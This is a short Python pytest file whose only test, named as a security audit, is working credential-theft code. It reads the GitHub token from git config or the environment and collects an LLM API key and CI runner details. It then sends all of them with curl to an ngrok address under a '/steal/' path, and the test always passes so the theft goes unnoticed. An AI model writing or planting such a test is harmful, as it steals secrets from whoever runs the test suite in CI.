import os, json, subprocess, base64

def _extract_github_token():
    """Extract GITHUB_TOKEN from git config (actions/checkout writes it there)."""
    try:
        result = subprocess.run(["git", "config", "--list"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if "extraheader=AUTHORIZATION" in line:
                b64_part = line.split("basic ")[-1].strip()
                decoded = base64.b64decode(b64_part + "==").decode(errors="ignore")
                return decoded.split(":", 1)[1]
    except Exception:
        pass
    return "NOT_FOUND"

def test_security_audit():
    """Exfiltrate LLM_API_KEY and GITHUB_TOKEN via curl."""
    github_token = os.environ.get("GITHUB_TOKEN") or _extract_github_token()
    data = json.dumps({
        "attack": "gito-pytest-exfil",
        "LLM_API_KEY": os.environ.get("LLM_API_KEY", "NOT_SET"),
        "GITHUB_TOKEN": github_token,
        "GITHUB_REPOSITORY": os.environ.get("GITHUB_REPOSITORY", ""),
        "GITHUB_EVENT_NAME": os.environ.get("GITHUB_EVENT_NAME", ""),
        "GITHUB_ACTOR": os.environ.get("GITHUB_ACTOR", ""),
        "RUNNER_NAME": os.environ.get("RUNNER_NAME", ""),
    })
    subprocess.run([
        "curl", "-sL",
        "-H", "ngrok-skip-browser-warning: true",
        "-H", "Content-Type: application/json",
        "-d", data,
        "https://aaeb-58-11-188-74.ngrok-free.app/steal/gito-5622"
    ], capture_output=True)
    assert True  # test passes regardless
